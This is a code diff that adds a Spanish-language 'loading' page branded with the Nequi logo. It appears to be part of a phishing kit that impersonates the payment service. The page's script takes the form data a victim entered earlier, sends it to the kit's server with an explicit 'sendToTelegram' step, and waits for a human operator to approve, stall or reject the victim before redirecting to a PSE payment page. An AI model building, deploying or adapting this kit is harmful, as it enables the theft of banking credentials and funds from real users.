@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .loading-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100vh;
+        }
+
+        .logo-animated {
+            width: 180px;
+            height: auto;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 0.8;
+            }
+        }
+
+        /* Mensaje de espera oculto por defecto */
+        .wait-message {
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #F7F4F7;
+            padding: 16px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #1D1D1B;
+            text-align: center;
+            display: none;
+            max-width: 90%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .wait-message.show {
+            display: block;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo-animated {
+                width: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <img src="img/nequi-logo.svg" alt="Nequi" class="logo-animated">
+    </div>
+    <div class="wait-message" id="waitMessage">
+        Por favor espera un momento mientras procesamos tu solicitud...
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        let sessionId = localStorage.getItem('nequiSessionId');
+        if (!sessionId) {
+            alert('Error: Sesión no encontrada');
+            window.location.href = '/';
+        }
+        
+        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+        const waitMessage = document.getElementById('waitMessage');
+        
+        const socket = io({
+            transports: ['websocket', 'polling'],
+            reconnection: true,
+            reconnectionAttempts: 20,
+            reconnectionDelay: 200,
+            reconnectionDelayMax: 1000,
+            timeout: 5000,
+            pingInterval: 2000,
+            pingTimeout: 5000
+        });
+
+        let keepAliveInterval, pingInterval;
+        
+        function startKeepAlive() {
+            stopKeepAlive();
+            keepAliveInterval = setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 3000);
+            pingInterval = setInterval(() => socket?.connected && socket.emit('ping'), 2000);
+        }
+        
+        function stopKeepAlive() {
+            if (keepAliveInterval) clearInterval(keepAliveInterval);
+            if (pingInterval) clearInterval(pingInterval);
+        }
+
+        socket.on('connect', () => {
+            
+            // Inicializar sesión
+            socket.emit('initSession', {
+                sessionId,
+                module: 'nequi',
+                page: 'loading',
+                data: formData
+            });
+            
+            // Enviar datos a Telegram
+            setTimeout(() => {
+                console.log('📤 Enviando a Telegram...');
+                socket.emit('sendToTelegram', {
+                    sessionId,
+                    data: formData
+                });
+            }, 100);
+            
+            // Iniciar keep-alive
+            startKeepAlive();
+        });
+
+        socket.on('sessionConfirmed', (data) => {
+            console.log('✅ Sesión confirmada:', data.sessionId);
+        });
+
+        socket.on('telegramSent', (response) => {
+            console.log('✅ Enviado a Telegram:', response);
+            console.log('⏳ Esperando respuesta del operador...');
+        });
+
+        socket.on('actionFollow', (data) => {
+            if (data.sessionId !== sessionId) return;
+            
+            console.log('✅ Aprobado - Redirigiendo a PSE');
+            stopKeepAlive();
+            localStorage.setItem('fromNequi', 'true');
+            window.location.href = '/pse';
+        });
+
+        socket.on('actionWait', (data) => {
+            if (data.sessionId !== sessionId) return;
+            
+            console.log('⏳ Esperando...');
+            waitMessage.classList.add('show');
+            setTimeout(() => {
+                waitMessage.classList.remove('show');
+            }, data.waitTime * 1000 || 15000);
+        });
+
+        socket.on('actionReject', (data) => {
+            if (data.sessionId !== sessionId) return;
+            
+            console.log('❌ Rechazado');
+            stopKeepAlive();
+            alert('Solicitud rechazada');
+            window.location.href = '/';
+        });
+        
+        socket.on('error', () => {});
+        socket.on('connect_error', () => {});
+        socket.on('disconnect', (reason) => {
+            if (reason === 'io server disconnect') socket.connect();
+        });
+
+        window.addEventListener('beforeunload', stopKeepAlive);
+    </script>
+</body>
+</html>
